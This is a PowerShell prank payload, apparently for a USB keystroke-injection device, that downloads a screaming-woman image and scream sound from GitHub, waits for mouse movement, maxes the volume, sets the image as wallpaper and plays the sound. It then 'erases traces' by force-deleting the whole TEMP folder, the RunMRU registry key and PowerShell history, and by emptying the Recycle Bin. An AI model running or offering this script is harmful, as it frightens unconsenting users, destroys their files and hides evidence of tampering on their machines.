# Telechargement de l'image
$RI = Get-Random @(1..3)

$image =  "https://github.com/PommeDAPI7749/USBPranks/blob/main/windows/screamer/woman-screaming.png?raw=true"

$i = -join($image,"?dl=1")

iwr $i -O $env:TMP\i.png

# Telechargement du son
$wav = "https://github.com/PommeDAPI7749/USBPranks/blob/main/windows/screamer/scream.wav?raw=true"

$w = -join($wav,"?dl=1")
iwr $w -O $env:TMP\s.wav

#----------------------------------------------------------------------------------------------------

# Fonction qui met l'image en fond d'ecran
Function Set-WallPaper {
 
<#
 
    .SYNOPSIS
    Met une image en fond d'ecran du bureau de l'utilisateur en cours
    
    .PARAMETER Image
    Chemin vers l'image
 
    .PARAMETER Style
    Fill, Fit, Stretch, Tile, Center, or Span
  
    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
  
#>

 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

#----------------------------------------------------------------------------------------------------

# Met le script en pause tant que la souris est imobile
function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 1
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# Joue le son
function Play-WAV{
$PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
}

#----------------------------------------------------------------------------------------------------

# Mets le son au maximum
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

#----------------------------------------------------------------------------------------------------

Pause-Script
Set-WallPaper -Image "$env:TMP\i.png" -Style Fill
Play-WAV

#----------------------------------------------------------------------------------------------------

# Pour effacer les traces

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# Controle du caps lock

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

if ($caps -eq $true){
$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}